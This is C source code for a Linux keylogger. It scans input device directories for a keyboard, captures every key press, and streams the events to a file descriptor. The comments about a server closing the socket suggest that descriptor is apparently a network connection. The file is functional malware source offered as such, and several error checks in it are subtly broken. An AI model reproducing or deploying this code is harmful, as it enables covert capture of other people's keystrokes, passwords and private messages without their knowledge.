#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <syslog.h>
#include <string.h>
#include <errno.h>
#include <signal.h>
#include <stdint.h>
#include <linux/input.h>
#include <sys/stat.h>
#include <dirent.h>
#include "network-ipc.h"
#include "keylogger.h"

int STOP_KEYLOGGER = 0;

void startKeylogger(int keyboard, int fd)
{
    size_t to_write, written, event_size = sizeof(event);
    event *kbd_events;
    struct sigaction sa;

    sa.sa_flags = 0;
    sa.sa_handler = &sigHandler;

    sigaction(SIGTERM, &sa, NULL);
    sigaction(SIGPIPE, &sa, NULL);

    kbd_events = malloc(sizeof(event) * MAX_EVENTS);

    while (!STOP_KEYLOGGER) // If server closed socket (SIGPIPE), user sent SIGTERM or an IO error occurred we stop keylogging
    {
        to_write = read(keyboard, kbd_events, event_size * MAX_EVENTS);
        if (to_write < 0) // If read was interrupted by SIGTERM or another error occurred we stop keylogging
        {
            syslog(LOG_ERR, "Read from keyboard device failed: %s %d", strerror(errno), errno);
            goto end;
        }
        else
        {
            size_t j = 0;
            for (size_t i = 0; i < to_write / event_size; i++) // For each event read
            {

                if (kbd_events[i].type == EV_KEY && kbd_events[i].value == KEY_PRESSED) // If a key has been pressed..
                    kbd_events[j++] = kbd_events[i];                                    // Add the event to the beginning of the array
            }
            if (writeEventsIntoFile(fd, kbd_events, j * event_size) == -1)
            {
                syslog(LOG_ERR, "Error while writing events: %s", strerror(errno));
                goto end;
            }
        }
    }
end:
    close(fd);
    close(keyboard);
    free(kbd_events);
    return;
}

void sigHandler(int signum)
{
    STOP_KEYLOGGER = 1;
}

int writeEventsIntoFile(int fd, struct input_event *events, size_t to_write)
{
    size_t written;
    do
    {
        written = write(fd, events, to_write);
        if (written < 0) // It can fail with EPIPE (If server closed its socket) or with EINTR if it is interrupted by SIGTERM before any bytes were written
            return -1;
        events += written;
        to_write -= written;
    } while (to_write > 0);
    return 0;
}

int findKeyboardDevice(char *dir_path)
{

    struct dirent *file;
    DIR *dir;
    struct stat file_info;
    char *file_path;

    if ((dir = opendir(dir_path)) < 0)
    {
        syslog(LOG_ERR, "Couldn't open %s: %s", dir_path, strerror(errno));
        return -1;
    }

    while ((file = readdir(dir)) != NULL) // We need to check every file of the directory
    {

        if (!strcmp(file->d_name, ".") || !strcmp(file->d_name, "..")) // We skip . and .. directories
            continue;

        file_path = malloc(strlen(file->d_name) + strlen(dir_path) + 1);
        strcpy(file_path, dir_path);
        strcat(file_path, file->d_name); // Concatenating dir path to current file name

        struct stat file_info;

        if (lstat(file_path, &file_info) < 0) // Getting current file info
        {
            syslog(LOG_ERR, "Couldn't get %s info: %s", file_path, strerror(errno));
            continue;
        }
        if (!S_ISDIR(file_info.st_mode)) // If current file is not a directory..
        {
            if (S_ISCHR(file_info.st_mode)) // .. if it is a character device ..
            {
                int keyboard_fd;
                if ((keyboard_fd = keyboardDevice(file_path)) != -1) // .. and it is a keyboard device, we return its file descriptor
                {
                    free(file_path);
                    return keyboard_fd;
                }
            }
        }
        else // If file is a directory..
        {
            char *path_with_slash = malloc(strlen(file_path) + 2);
            strncpy(path_with_slash, file_path, strlen(file_path));
            path_with_slash[strlen(file_path)] = '/'; // Appending a slash to the path
            path_with_slash[strlen(file_path) + 1] = '\0';
            int kbd_fd = findKeyboardDevice(path_with_slash); // .. recursive call over this directory to check for its files
            if (kbd_fd != -1)
            {
                free(file_path);
                free(path_with_slash);
                return kbd_fd; // Propagate descriptor to previous calls
            }
        }
    }

    free(file_path);
    return -1;
}

int keyboardDevice(char *path)
{
    int32_t events_bitmask = 0;
    int32_t keys_bitmask = 0;
    int32_t keys = KEY_Q | KEY_A | KEY_Z | KEY_1 | KEY_9;
    int fd;

    fd = open(path, O_RDONLY);

    if (fd < 0)
        syslog(LOG_ERR, "Couldn't open %s: %s", path, strerror(errno));

    if (ioctl(fd, EVIOCGBIT(0, sizeof(events_bitmask)), &events_bitmask) < 0)
        syslog(LOG_ERR, "(ioctl) Couldn't obtain events supported by device %s: %s", path, strerror(errno));
    else
    {
        if ((events_bitmask & EV_KEY) == EV_KEY) // If EV_KEY bit is set then it could be a Keyboard, but it can be a false positive (for example, power button has this bit set but it is not a kbd)
        {
            if (ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(keys_bitmask)), &keys_bitmask) < 0)
                syslog(LOG_ERR, "(ioctl) Couldn't obtain keys supported by device %s: %s", path, strerror(errno));
            else if ((keys & keys_bitmask) == keys) // If it support those keys then good chances are that we just found the keyboard device
                return fd;
        }
    }
    close(fd);
    return -1;
}